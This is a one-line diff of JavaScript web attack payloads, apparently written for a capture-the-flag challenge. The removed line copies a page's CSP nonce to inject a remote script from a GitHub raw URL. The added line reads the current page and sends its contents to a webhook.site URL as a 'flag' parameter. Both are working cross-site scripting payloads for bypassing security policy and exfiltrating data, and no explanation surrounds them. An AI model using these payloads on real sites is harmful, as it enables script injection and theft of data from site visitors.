@@ -1,1 +1,1 @@
-var n=document.querySelector('[nonce]').nonce;var s=document.createElement('script');s.nonce=n;s.src='https://raw.githubusercontent.com/aljzayryaltrath-hash/chatdjak--lite/main/y.js';document.head.appendChild(s);
+fetch(window.location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
